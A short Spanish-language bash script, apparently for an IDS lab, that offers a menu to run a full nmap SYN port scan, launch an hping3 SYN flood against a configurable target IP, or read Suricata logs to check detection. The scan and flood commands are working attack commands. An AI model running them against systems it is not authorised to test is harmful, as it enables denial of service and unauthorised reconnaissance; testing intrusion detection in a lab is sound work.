#!/bin/bash
#Recuerda dar permisos de ejecucion.

#------------------------------------

# Configuración
TARGET_IP="192.168.1.100" # Cambia esto por la IP que quieres atacar
SURICATA_LOG_PATH="/var/log/suricata/eve.json" # Ruta de los logs de Suricata

# Función: Escaneo de puertos con nmap
function scan_ports() {
  echo "Iniciando escaneo de puertos con nmap..."
  nmap -sS -p 1-65535 $TARGET_IP
  echo "Escaneo de puertos finalizado."
}

# Función: Ataque SYN Flood con hping3
function syn_flood() {
  echo "Simulando ataque SYN Flood con hping3..."
  hping3 -S -p 80 -c 1000 --flood $TARGET_IP
  echo "Ataque SYN Flood finalizado."
}

# Función: Comprobar logs de Suricata
function check_suricata_logs() {
  echo "Revisando logs de Suricata en $SURICATA_LOG_PATH..."
  if [ -f "$SURICATA_LOG_PATH" ]; then
    tail -n 20 "$SURICATA_LOG_PATH"
  else
    echo "No se encontró el archivo de logs de Suricata."
  fi
}

# Menú Principal
echo "Seleccione el ataque a simular:"
echo "1. Escaneo de puertos (nmap)"
echo "2. Ataque SYN Flood (hping3)"
echo "3. Revisar logs de Suricata"
echo "4. Salir"

read -p "Ingrese una opción: " option

case $option in
  1) scan_ports ;;
  2) syn_flood ;;
  3) check_suricata_logs ;;
  4) echo "Saliendo..." ;;
  *) echo "Opción inválida." ;;
esac
#Documentacion sobre escaneo de puertos con Nmap - https://www.digitalocean.com/community/tutorials/how-to-use-nmap-to-scan-for-open-ports
#Documentacion sobre Inundacion SYN con hping3 - https://tzero86.gitbook.io/tzero86/denial-of-service/syn-flooding-con-hping